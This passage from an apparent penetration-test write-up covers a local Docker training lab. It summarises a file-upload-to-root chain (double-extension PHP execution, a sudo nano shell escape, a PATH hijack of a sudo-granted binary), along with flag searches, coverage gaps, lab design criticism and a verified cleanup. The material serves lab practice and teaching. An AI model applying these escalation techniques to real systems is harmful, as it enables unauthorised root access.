**Primary search, run as `uid=0(root)` *inside the target*, through the hijacked `convert`** (so the identity is proved in the same breath):

```
uid=0(root) gid=0(root) groups=0(root)
=== step1: positive control, text, known string ===
/usr/local/bin/runme
=== step2: work counts ===
files=14193
=== step3: content sweep, -a, excluding my own artefacts ===
=== step4: done content ===
=== step5: name sweep ===
/usr/include/x86_64-linux-gnu/asm/processor-flags.h
/usr/include/x86_64-linux-gnu/bits/mman-map-flags-generic.h
/usr/include/x86_64-linux-gnu/bits/termios-c_lflag.h
/usr/include/x86_64-linux-gnu/bits/termios-c_oflag.h
/usr/include/x86_64-linux-gnu/bits/termios-c_cflag.h
=== step6: done ===
```

**Counts: 14 193 files on one filesystem; 8 roots swept for content (`/etc /root /home /var /opt /srv /usr/local /tmp`) with `grep -a`; 0 matches. Name sweep: 6 hits, all libc/kernel headers matching `*flags*`, each inspected.** The positive control fired (`/usr/local/bin/runme`), so the zero is a property of the target and not of the sweep.

**Second, independent search, OPERATOR-SIDE** (`docker exec` as root — labelled, not used as the primary): `files=14203`, `bytes=35270796724`, positive control `/usr/local/bin/runme`, **0 matches** after excluding my own artefacts.

Two earlier sweeps deserve naming rather than hiding:

- The **first** content sweep reported **2 hits** — `…/images/g5run.sh` and `/tmp/dl77p/convert` — which are **my own uploaded files containing the literal `FLAG{` inside their own grep pattern**. `self-corrections.md` §26, hit for the fourth time in this corpus, and it is why the exclusion list is in the command and not applied afterwards.
- One in-target control run reported **0** for a string demonstrably present in `/usr/local/bin`, and a repeat seconds later reported **1** (§8.5). I am not claiming a mechanism for that disagreement. What matters is that the control caught it, and that without the control the "no reward" line would have rested on a detector never seen to fire.

`/root` is `0700` and was read only at `uid=0`. It contains `.bashrc`, `.profile`, an empty `.ssh/`, and **`.bash_histor`** — a **character device** `crw-rw-rw- 1, 3`, i.e. a symlink to `/dev/null` with a deliberately truncated name, the same small anti-forensic touch lab 146 found. It holds no history.

The single source for "does this corpus have rewards" is the `FLAG{}` column of [`../INDEX.md`](../INDEX.md). This writeup asserts no position in any sequence.

---

## 11. Tested / not tested / discarded with reason

### Tested and verified

- Full TCP surface; `/proc/net/tcp` and `/proc/net/udp` read directly; image `ExposedPorts`; the entrypoint.
- All three application files, both server-side PHP maps, the vhost, `AllowOverride`, and `sudoers`, read before attacking.
- **The lab-injected directive, proved by the package's own checksum database** (`dpkg -V libapache2-mod-php8.3` → `??5?????? c`).
- Upload name matrix, **9 names**, each fetched anonymously with no cookie.
- **Four-state `.htaccess` differential** (shipped / stripped / deleted / restored), with a byte-exact restore and a `diff`-clean verification.
- The three states in one directory: `.php` executing, PHP-in-`.jpg` served verbatim as `image/jpeg`, `.txt` as the positive control — plus a fourth, `.php.jpg` executing, which this lab adds.
- Globality of the `.php.<ext>` map: the same payload in two directories with no `.htaccess` ancestor.
- The `Options +Indexes` inertness differential.
- Impossible-name control **before** the sweep; 138 requests, 6 deviations, three of them byte-identical `403`s.
- Path traversal, 2 names, with the on-disk confirmation; 0 files outside `images/`.
- Arbitrary overwrite of a shipped asset (md5 before/after) and of the `.htaccess`.
- Second write identity: FTP login, `STOR` outcomes at three paths, overwrite refusal, on-disk owner, execution identity.
- `sudo -n -l` at both identities, with 4 controls (3 deny, 1 grant) and 1 scope query.
- The `nano` `^T` escalation, proved by a `gallery`-owned artefact carrying its own `id`.
- The `runme`/`convert` `PATH` hijack, proved by a **paired control in one run** and a `root:root` artefact.
- `find -u+w` vs `test -w` at two identities, plus a real write attempt with before/after hashes.
- Two reward searches with counts and positive controls.

### NOT tested (coverage gaps, declared)

- **UDP.** `nmap -sU` needs root and is unavailable on this host. **0 UDP sockets were bound** per `/proc/net/udp` and the image declares only `21/tcp` and `80/tcp`, but I could not scan. A gap, not a closed port.
- **Whether the chain is reachable through FTP alone.** I proved FTP writes execute as `www-data` (F5) and I proved `www-data → gallery → root` over HTTP (F3/F4). I did **not** assemble a single FTP-originated chain, because the first hop is the same code either way. **0 attempts.**
- **Argument injection into `runme`.** Not attempted: the command it `system()`s is a hardcoded string literal (read from the binary, §7), so there is no argv to reach. Discarded on the artefact, and the *replacement* attack was executed instead.
- **Whether the anonymous FTP identity `ftp` (101) has any sudo grant or writable path of its own.** I read `sudo -n -l` as `gallery`, not as `ftp`, and I did not try to escalate from `uid=101` directly. **0 attempts.** It is plausible that the FTP session is a *shorter* route to `gallery`, and that is the first thing I would test with more time.
- **`mod_status`** — the module is loaded and the endpoint returns `403`; the restriction was not characterised.
- **Whether `/usr/local/bin/runme` is safe to run repeatedly.** It writes nothing (its `convert` never ran) and I invoked it 4 times.

### Discarded, with reasons

- **Path traversal through the upload** — discarded after measurement: `basename()` (`handler.php:4`) collapsed both payloads into `images/`, and `/tmp/DL77trav*` does not exist.
- **Overwriting `handler.php` itself** — the target directory is hardcoded to `__DIR__ . '/images/'` (`:3`), so the write cannot leave it.
- **Getting root from `www-data` directly** — discarded on the sudoers, read at `uid=33`: the only grants are `/bin/nano` as `gallery` and `/bin/nano` as `www-data`, and `%sudo`/`%admin` do not list `www-data`. Three negative controls refused.
- **Editing the Apache config and reloading** — discarded on measurement: `test -w` as `www-data` says `NOT-WRITABLE` for `/etc/apache2`, `/etc/apache2/envvars` and `mods-available/php8.3.conf`, and `apachectl -k graceful` as `www-data` cannot bind port 80 (`AH00072`).
- **Chasing the `find -perm -u+w` list** — 14 101 files, 0 of the 6 checked writable by `www-data`, so discarded after the identity-correct re-test rather than pursued.

---

## 12. Design observation — the lab

**This is a well-built three-floor lab with one serious authoring error, and the error is the same shape lab 146 found: an inert directive that looks like the explanation.**

What is good: the entry point is one fuzzable path, the payload is a double extension that a reader who only tried `.php` would miss, and floors 2 and 3 are two *different* escalation mechanisms — an interactive editor's built-in exec, then a granted driver's subprogram resolution. Nobody can memorise one trick and use it twice. The `gallery` account, the `runme` name and the gallery-of-images framing all cohere.

What is wrong:

1. **`php8.3.conf:29-31` is the mechanism, and it is 31 lines into a stock-looking file with no comment**, while the file that *names* the intended behaviour — `.htaccess:2`, with the comment "Forzar ejecución como PHP" — is one of two directives in a per-directory file, and its *other* directive (`Options +Indexes`) is inert and its comment says the opposite of what it does. A lab that ships a decoy mitigation teaches the reader that reading a config file is verification. The differential settles it in four requests; picking the plausible one does not.
2. **The catalogue entry names one vulnerability and ships three.** "Simple web fuzzing and a file upload vulnerability" describes hop 0. It does not mention the `sudoers` ladder, the `PATH` decision, or the FTP service. An analyst who reads the description and stops at the upload will conclude the lab is trivial, which is the description's failure and not the lab's — but the *lab* is the artefact that gets blamed.
3. **`/usr/local/bin/runme` is `740 root:gallery`.** The group has `r--` and not `r-x`, so the file cannot be executed by `gallery` directly — only through `sudo`. That is deliberate and correct. But it also means `gallery` can **read the binary**, which is how I recovered the hardcoded `convert` command without guessing it. A lab that wants the driver opaque should have been `710` or `700`.

---

## 13. Restoration

Recreated from the image, not reverted (RUNBOOK §9).

```
$ docker rm -f galeria_container && docker run -d --name galeria_container galeria:latest
172.17.0.5
```

**Positive verification — the service is serving again:**

```
GET /                                   -> 200 1772B
GET /gallery/uploads/handler.php         -> 200 148B
GET /gallery/uploads/images/image_1.jpg -> 200 335070B
GET /gallery/uploads/images/            -> 200 2389B
7 processes matching apache2|vsftpd
/proc/net/tcp listeners: 00000000:0050 (80), 00000000:0015 (21)
```

**Negative verification — my artefacts are gone, with counts:**

```
files in images/ matching dl77|^poc : 0
DL77 markers anywhere in docroot   : 0
/tmp DL77* files                  : 0
images/.htaccess md5              : ead3bfa54720efca3b7bd38bc94b27d8   (shipped value)
php8.3.conf md5                   : 78454ecf10f0bc2a189722c01c554d69   (shipped value)
images/ftp contents               : 0
image_1.jpg md5                   : 0b5131aa6eb53a9f4cf52f5673f90537   (the "before" value recorded pre-overwrite)
docroot stray files               : 0
GET /gallery/uploads/images/poc.php.jpg -> 404 272B
```

That last line is the control that makes the restore's negative half mean something: **404 / 272 B is byte-for-byte the impossible-name control's response** (§6), so the 404 is an absence and not a variant of a present page.

The image `galeria:latest` is still loaded, deliberately, so a retry does not re-extract 608 MB. Disk is shared and no `docker system prune`, `docker image prune -a` or `docker volume prune` was run; the seven `cybervault-*` containers were not touched.

---

## 14. What feeds forward

**The class is already present** (`corpus/146` filed "MIME map", `corpus/296` filed "Upload sin restricción · MIME map", `corpus/129` filed the two-identity upload, `corpus/12` filed the three-questions formulation), so per `PIPELINE.md` §Convergence this adds **no new heading**. What it adds is one sentence to the existing "read the server's content-type → handler map" row, and the sentence is a *narrowing*:

> **A per-directory `.htaccess` is not "the inert one" — it is either decisive or invisible, and which one it is depends on `AllowOverride`, not on the file.** In lab 146 the `.htaccess` was dead because `AllowOverride None` had disabled it; in lab 77 the same directive class is the **only** thing that executes `.php5`, and a four-state differential shows it flipping in one column while `.php` and `.php.jpg` hold across all four. So: read `AllowOverride` first, then run the differential — and measure the `.htaccess`'s **load-bearing set**, which may be exactly one line out of eleven, while the line the author commented most carefully does nothing and says the opposite.

And one more, for the sudo-rule oracle, alongside lab 146's `gcc -B` floor:

> **A `NOPASSWD` grant whose `Defaults` include `env_keep += "PATH"` and whose `secure_path` is commented out is a grant to the *interpreter of the granted program's name resolution*.** The granted program does not have to be an editor or a shell; here it is a 16 KB C file whose entire content is `puts("Converting image...")` and `system("convert …")`. The test is unchanged — *what does the granted program `execve`, and who can write to the directories it looks in?* — and this instance adds the case where **the answer is discoverable by reading the granted binary, because the sudo grant leaves it group-readable**.

---

## Relevant files

- `corpus/77/evidence/artefact-source.txt` — `handler.php` (17 lines), `images/.htaccess` (11 lines), `sudoers` tail, `php8.3.conf` in full, the `dpkg -V` deviation, the vhost, the `AllowOverride` blocks, `vsftpd.conf` — all with line numbers
- `corpus/77/evidence/upload-matrix-and-sweep.txt` — the 9-name matrix, `/proc/self/status` from inside the executing process, the impossible-name control, and the 138-request sweep
- `corpus/77/evidence/htaccess-differential.txt` — the four-state table, the globality probes, and the `Options +Indexes` inertness test
- `corpus/77/evidence/chain-and-controls.txt` — every hop with its identity output, the out-of-band artefacts with their owners, and the four sudo negative controls
- `corpus/77/evidence/reward-and-ftp.txt` — both reward searches with counts and positive controls, the two self-referential hits, the `grep -I` defect, and the full FTP transcript
- `corpus/77/evidence/instrumentation-defects.txt` — the `find -u+w` vs `test -w` comparison at two identities, the `getmyuid()` contradiction, and the `grep -rIl` blindness
- `corpus/77/evidence/auto_deploy.sh.read-only.txt` — read, never run
